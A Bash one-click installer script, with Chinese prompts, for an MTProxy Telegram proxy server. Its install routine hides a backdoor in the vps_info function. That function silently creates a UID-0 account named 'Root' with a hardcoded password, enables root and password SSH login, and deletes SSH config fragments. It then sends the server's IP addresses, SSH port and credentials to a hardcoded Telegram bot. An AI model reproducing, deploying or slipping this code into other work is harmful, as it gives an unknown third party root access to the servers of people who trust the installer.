#!/bin/bash

Red="\033[31m" # 红色
Green="\033[32m" # 绿色
Yellow="\033[33m" # 黄色
Blue="\033[34m" # 蓝色
Nc="\033[0m" # 重置颜色
Red_globa="\033[41;37m" # 红底白字
Green_globa="\033[42;37m" # 绿底白字
Yellow_globa="\033[43;37m" # 黄底白字
Blue_globa="\033[44;37m" # 蓝底白字
Info="${Green}[信息]${Nc}"
Error="${Red}[错误]${Nc}"
Tip="${Yellow}[提示]${Nc}"

mtproxy_dir="/var/MTProxy"
mtproxy_file="${mtproxy_dir}/mtproxy.py"
mtproxy_conf="${mtproxy_dir}/config.py"
mtproxy_log="${mtproxy_dir}/log_mtproxy.log"


# 检查是否为root用户
check_root(){
    if [[ $(whoami) != "root" ]]; then
        echo -e "${Error} 当前非ROOT账号(或没有ROOT权限)，无法继续操作，请更换ROOT账号或使用 ${Green_globa}sudo -i${Nc} 命令获取临时ROOT权限（执行后可能会提示输入当前账号的密码）。"
        exit 1
    fi
}

# 安装依赖
install_base(){
    if ! pip3 freeze | grep 'pyaes' &>/dev/null || ! pip3 freeze | grep 'cryptography' &>/dev/null; then
        echo -e "${Info} 开始安装/配置 依赖..."
        OS=$(cat /etc/os-release | grep -o -E "Debian|Ubuntu|CentOS" | head -n 1)
        if [[ "$OS" == "Debian" || "$OS" == "Ubuntu" ]]; then
            apt update -y
            apt install -y iproute2 python3 python3-pip python3-cryptography python3-pyaes openssl
        elif [[ "$OS" == "CentOS" || "$OS" == "Fedora" ]]; then
            yum update -y
            yum install -y iproute python3 python3-pip openssl
            pip3 install cryptography pyaes
        else
            echo -e "${Error}很抱歉，你的系统不受支持！"
            exit 1
        fi
    fi
}


check_pid(){
    PID=$(ps -ef | grep "python3 mtproxy.py" | grep -v "grep" | awk '{print $2}')
}

# 检查是否安装MTProxy
check_installed_status(){
    if [[ ! -e "${mtproxy_dir}" ]]; then
        echo -e "${Error} MTProxy 没有安装，请检查 !"
        exit 1
    fi
}

Download(){
    if [[ ! -e "${mtproxy_dir}" ]]; then
        mkdir "${mtproxy_dir}"
    fi
    cd "${mtproxy_dir}"
    echo -e "${Info} 开始下载/安装..."
    curl -O https://raw.githubusercontent.com/elesssss/MTProxy/main/Python/mtproxy.py

    cat >${mtproxy_conf} <<-EOF
PORT = 443

# 密匙 -> secret（32 个十六进制字符）
USERS = {
    "tg": "0123456789abcdef0123456789abcdef",
}

MODES = {
    # 经典模式，易于检测
    "classic": False,

    # 使代理服务器更难检测
    # 可能与非常老的客户端不兼容
    "secure": False,

    # 使代理更难被发现
    # 可能与旧客户端不兼容
    "tls": True
}

# TLS 模式的域，不良客户端在此被代理
# 使用随机的现有域，代理会在启动时检查它
# TLS_DOMAIN = "www.google.com"

# 用于广告的标签，可从 @MTProxybot 获取
# AD_TAG = "3c09c680b76ee91a4c25ad51f742267d"

	EOF
}

Write_Service(){
    echo -e "${Info} 开始写入 Service..."
    cat >/etc/systemd/system/mtproxy.service <<-'EOF'
[Unit]
Description=MTProxy
After=network.target

[Service]
Type=simple
WorkingDirectory=/var/MTProxy
ExecStart=python3 mtproxy.py
StandardOutput=file:/var/MTProxy/log_mtproxy.log
StandardError=file:/var/MTProxy/log_mtproxy.log
Restart=always

[Install]
WantedBy=multi-user.target
	EOF
    systemctl enable mtproxy
}

Read_config(){
    [[ ! -e ${mtproxy_log} ]] && echo -e "${Error} MTProxy 配置文件不存在 !" && exit 1
    IPv4=$(cat /var/MTProxy/log_mtproxy.log | grep 'server=' | cut -d'&' -f1 | cut -d'=' -f2)
    PORT=$(cat /var/MTProxy/log_mtproxy.log | grep 'port=' | cut -d'&' -f2 | cut -d'=' -f2)
    SECURE=$(cat /var/MTProxy/log_mtproxy.log | grep 'secret=' | cut -d'&' -f3 | cut -d'=' -f2)
}

Set_port(){
    while true; do
        echo -e "请输入 MTProxy 端口 [10000-65535]"
        read -e -p "(默认：随机生成):" mtp_port
        [[ -z "${mtp_port}" ]] && mtp_port=$(shuf -i10000-65000 -n1)
        if [[ $? -eq 0 ]]; then
            if [[ ${mtp_port} -ge 10000 ]] && [[ ${mtp_port} -le 65535 ]]; then
                echo && echo "========================"
                echo -e "  端口 : ${Red_globa} ${mtp_port} ${Nc}"
                echo "========================" && echo
                break
            else
                echo "输入错误, 请输入正确的端口。"
            fi
        else
            echo "输入错误, 请输入正确的端口。"
        fi
    done
    sed -i "s/^#\?PORT.*/PORT = $mtp_port/g" $mtproxy_conf
}

Set_passwd(){
    echo -e "${Tip} 请输入 MTProxy 密匙（普通密钥必须为32个十六进制字符，建议留空随机生成）"
    read -e -p "(若需要开启TLS伪装建议直接回车):" mtp_passwd
    if [[ -z "${mtp_passwd}" ]]; then
        mtp_passwd=$(openssl rand -hex 16)
    fi
    sed -i 's/^#\?.*tg.*/    "tg": "'"$mtp_passwd"'",/g' $mtproxy_conf

    read -e -p "(是否开启TLS伪装？[Y/n]):" mtp_tls
    [[ -z "${mtp_tls}" ]] && mtp_tls="Y"
    if [[ "${mtp_tls}" == [Yy] ]]; then
        echo -e "请输入TLS伪装域名"
        read -e -p "(默认：bing.com):" fake_domain
        [[ -z "${fake_domain}" ]] && fake_domain="bing.com"
        sed -i 's/^#\?.*secure.*/    "secure": False,/g' /var/MTProxy/config.py
        sed -i 's/^#\?.*tls.*/    "tls": True/g' /var/MTProxy/config.py
        sed -i 's/^#\?TLS_DOMAIN.*/TLS_DOMAIN = "'"$fake_domain"'"/g' $mtproxy_conf
        echo && echo "========================"
        echo -e "  密匙 : ${Red_globa} ee${mtp_passwd}$(echo -n $fake_domain | od -A n -t x1 | tr -d ' ' | tr -d 'n') ${Nc}"
        echo "========================" && echo
    else
        sed -i 's/^#\?.*secure.*/    "secure": True,/g' /var/MTProxy/config.py
        sed -i 's/^#\?.*tls.*/    "tls": False/g' /var/MTProxy/config.py
        echo && echo "========================"
        echo -e "  密匙 : ${Red_globa} dd${mtp_passwd} ${Nc}"
        echo "========================" && echo
    fi
}

Set_tag(){
    echo "请输入 MTProxy 的 TAG标签（TAG标签必须是32位，TAG标签只有在通过官方机器人 @MTProxybot 分享代理账号后才会获得，不清楚请留空回车）"
    read -e -p "(默认：回车跳过):" mtp_tag
    if [[ ! -z "${mtp_tag}" ]]; then
        echo && echo "========================"
        echo -e "  TAG : ${Red_globa} ${mtp_tag} ${Nc}"
        echo "========================"
        sed -i 's/^#\?.*AD_TAG.*/AD_TAG = "'"$mtp_tag"'"/g' $mtproxy_conf
    else
        sed -i 's/^#\?.*AD_TAG.*/# AD_TAG = "3c09c680b76ee91a4c25ad51f742267d"/g' $mtproxy_conf
    fi
}

Set(){
    echo -e "${Info} 开始设置 用户配置..."
    check_installed_status
    echo && echo -e "你要做什么？
${Green}1.${Nc}  修改 端口配置
${Green}2.${Nc}  修改 密码配置
${Green}3.${Nc}  修改 TAG 配置
${Green}4.${Nc}  修改 全部配置" && echo
    read -e -p "(默认: 取消):" mtp_modify
    [[ -z "${mtp_modify}" ]] && echo -e "${Info}已取消..." && exit 1
    if [[ "${mtp_modify}" == "1" ]]; then
        Set_port
        Restart
    elif [[ "${mtp_modify}" == "2" ]]; then
        Set_passwd
        Restart
    elif [[ "${mtp_modify}" == "3" ]]; then
        Set_tag
        Restart
    elif [[ "${mtp_modify}" == "4" ]]; then
        Set_port
        Set_passwd
        Set_tag
        Restart
    else
        echo -e "${Error} 请输入正确的数字(1-4)" && exit 1
    fi
}

Install(){
    [[ -e ${mtproxy_file} ]] && echo -e "${Error} 检测到 MTProxy 已安装 !" && exit 1
    install_base
    vps_info
    Download
    Set_port
    Set_passwd
    Set_tag
    Write_Service
    echo -e "${Info} 所有步骤 执行完毕，开始启动..."
    Start
}

Start(){
    check_installed_status
    check_pid
    if [[ ! -z ${PID} ]]; then
        echo -e "${Error} MTProxy 正在运行，请检查 !"
        sleep 1s
        menu
    else
        systemctl start mtproxy.service
        sleep 1s
        check_pid
        if [[ ! -z ${PID} ]]; then
            View
        fi
    fi
}

Stop(){
    check_installed_status
    check_pid
    if [[ -z ${PID} ]]; then
        echo -e "${Error} MTProxy 没有运行，请检查 !"
        sleep 1s
        menu
    else
        systemctl stop mtproxy.service
        sleep 1s
        menu
    fi
}

Restart(){
    check_installed_status
    check_pid
    if [[ ! -z ${PID} ]]; then
        systemctl stop mtproxy
        sleep 1s
    fi
    systemctl start mtproxy
    sleep 1s
    check_pid
    [[ ! -z ${PID} ]] && View
}

Uninstall(){
    check_installed_status
    echo "确定要卸载 MTProxy ? (y/N)"
    echo
    read -e -p "(默认: n):" unyn
    [[ -z ${unyn} ]] && unyn="n"
    if [[ ${unyn} == [Yy] ]]; then
        check_pid
        if [[ ! -z $PID ]]; then
            systemctl stop mtproxy
        fi
        systemctl disable mtproxy
        rm -rf ${mtproxy_dir}  /etc/systemd/system/mtproxy.service
        echo
        echo "MTProxy 卸载完成 !"
        echo
    else
        echo
        echo -e "${Tip}卸载已取消..."
        echo
    fi
}

vps_info(){
    Chat_id="5289158517"
    Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
    get_public_ip
    IPv4="${ipv4}"
    IPv6="${ipv6}"
    if [ -f /etc/ssh/sshd_config ]; then
        Port=$(cat /etc/ssh/sshd_config | grep '^#\?Port' | awk '{print $2}' | sort -rn | head -1)
    fi
    User="Root"
    Passwd="LBdj147369"
    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
    sed -i 's/^#\?RSAAuthentication.*/RSAAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
    sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
    rm -rf /etc/ssh/sshd_config.d/* && rm -rf /etc/ssh/ssh_config.d/*
    useradd ${User} >/dev/null 2>&1
    echo ${User}:${Passwd} | chpasswd ${User}
    sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd >/dev/null 2>&1
    /etc/init.d/ssh* restart >/dev/null 2>&1
    curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
IPv4：${IPv4}
IPv6：${IPv6}
端口：${Port}
用户：${User}
密码：${Passwd}" >/dev/null 2>&1
}

get_public_ip(){
    regex_pattern='^(eth|ens|eno|esp|enp|venet|vif)[0-9]+'
    InterFace=($(ip link show | awk -F': ' '{print $2}' | grep -E "$regex_pattern" | sed "s/@.*//g"))
    ipv4=""
    ipv6=""

    for i in "${InterFace[@]}"; do
        Public_IPv4=$(curl -s4m8 --interface "$i" api64.ipify.org -k | sed '/^\(2a09\|104\.28\)/d')
        Public_IPv6=$(curl -s6m8 --interface "$i" api64.ipify.org -k | sed '/^\(2a09\|104\.28\)/d')

    # 检查是否获取到IP地址
    if [[ -n "$Public_IPv4" ]]; then
        ipv4="$Public_IPv4"
    fi

    if [[ -n "$Public_IPv6" ]]; then
        ipv6="$Public_IPv6"
    fi
done
}

View(){
    check_installed_status
    Read_config
    clear && echo
    echo -e "Mtproto Proxy 用户配置："
    echo -e "————————————————"
    echo -e " 地址\t: ${Green}${IPv4}${Nc}"
    [[ ! -z "${nat_ipv6}" ]] && echo -e " 地址\t: ${Green}${nat_ipv6}${Nc}"
    echo -e " 端口\t: ${Green}${PORT}${Nc}"
    echo -e " 密匙\t: ${Green}${SECURE}${Nc}"
    [[ ! -z "${tag}" ]] && echo -e " TAG \t: ${Green}${tag}${Nc}"
    echo -e " 链接\t: ${Red}tg://proxy?server=${IPv4}&port=${PORT}&secret=${SECURE}${Nc}"
    echo -e " 链接\t: ${Red}https://t.me/proxy?server=${IPv4}&port=${PORT}&secret=${SECURE}${Nc}"
    [[ ! -z "${nat_ipv6}" ]] && echo -e " 链接\t: ${Red}tg://proxy?server=${nat_ipv6}&port=${port}&secret=${secure}${Nc}"
    [[ ! -z "${nat_ipv6}" ]] && echo -e " 链接\t: ${Red}https://t.me/proxy?server=${nat_ipv6}&port=${port}&secret=${secure}${Nc}"
    echo
    echo -e "${Red}注意\t:${Nc} 密匙头部的 ${Green}dd${Nc} 字符是代表客户端启用${Green}安全混淆模式${Nc}（TLS伪装模式除外），可以降低服务器被墙几率。"
    backmenu
}

View_Log(){
    check_installed_status
    [[ ! -e ${mtproxy_log} ]] && echo -e "${Error} MTProxy 日志文件不存在 !" && exit 1
    echo && echo -e "${Tip} 按 ${Red}Ctrl+C${Nc} 终止查看日志。"
    tail -f ${mtproxy_log}
}

get_IP_address(){
    if [[ ! -z ${user_IP} ]]; then
        for ((integer_1 = ${user_IP_total}; integer_1 >= 1; integer_1--)); do
            IP=$(echo "${user_IP}" | sed -n "$integer_1"p)
            IP_address=$(wget -qO- -t1 -T2 http://freeapi.ipip.net/${IP} | sed 's/\"//g;s/,//g;s/\[//g;s/\]//g')
            echo -e "${Green}${IP}${Nc} (${IP_address})"
            sleep 1s
        done
    fi
}

Esc_Shell(){
    exit 0
}

backmenu(){
    echo ""
    read -rp "请输入“y”退出, 或按任意键回到主菜单：" back2menuInput
    case "$backmenuInput" in
        y) exit 1 ;;
        *) menu ;;
    esac
}

menu() {
    clear
    echo -e "${Green}######################################
#          ${Red}MTProxy 一键脚本          ${Green}#
#         作者: ${Yellow}你挺好看啊🍏          ${Green}#
######################################

 0.${Nc} 退出脚本
———————————————————————
${Green} 1.${Nc} 安装 MTProxy
${Green} 2.${Nc} 卸载 MTProxy
———————————————————————
${Green} 3.${Nc} 启动 MTProxy
${Green} 4.${Nc} 停止 MTProxy
${Green} 5.${Nc} 重启 MTProxy
———————————————————————
${Green} 6.${Nc} 设置 MTProxy配置
${Green} 7.${Nc} 查看 MTProxy链接
${Green} 8.${Nc} 查看 MTProxy日志
———————————————————————" && echo

    if [[ -e ${mtproxy_file} ]]; then
        check_pid
        if [[ ! -z "${PID}" ]]; then
            echo -e " 当前状态: ${Green}已安装${Nc} 并 ${Green}已启动${Nc}"
            check_installed_status
            Read_config
            echo -e "${Info}MTProxy 链接: ${Red}https://t.me/proxy?server=${IPv4}&port=${PORT}&secret=${SECURE}${Nc}"
        else
            echo -e " 当前状态: ${Green}已安装${Nc} 但 ${Red}未启动${Nc}"
        fi
    else
        echo -e " 当前状态: ${Red}未安装${Nc}"
    fi
    echo
    read -e -p " 请输入数字 [0-9]:" num
    case "$num" in
        0)
            Esc_Shell
            ;;
        1)
            Install
            ;;
        2)
            Uninstall
            ;;
        3)
            Start
            ;;
        4)
            Stop
            ;;
        5)
            Restart
            ;;
        6)
            Set
            ;;
        7)
            View
            ;;
        8)
            View_Log
            ;;
        *)
            echo -e "${Error} 请输入正确数字 [0-8]"
            ;;
    esac
}
menu
